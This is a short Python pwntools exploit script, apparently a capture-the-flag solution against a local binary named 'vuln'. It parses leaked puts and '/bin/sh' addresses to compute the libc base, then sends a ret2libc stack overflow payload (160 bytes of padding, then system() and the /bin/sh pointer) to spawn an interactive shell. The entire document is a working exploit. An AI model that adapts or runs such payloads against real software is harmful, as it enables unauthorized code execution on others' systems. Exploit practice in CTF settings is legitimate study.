from pwn import *

puts_offset = 0x0005f140
system_offset = 0x0003a940


p = process('./vuln')

p.recvuntil("puts: ")
puts = int(p.recv(10),16)

p.recvuntil("useful_string: ")
bin_sh = int(p.recv(10),16)
print "bin_sh : ",hex(bin_sh)
libc_base = puts - puts_offset
print "libc_base : "+hex(libc_base)

system_libc = libc_base + system_offset
print "system_libc : "+hex(system_libc)

payload = ""
payload += "A"*160
payload += p32(system_libc)
payload += "JUNK"
payload += p32(bin_sh)
#pause()
p.sendline(payload)
p.interactive()
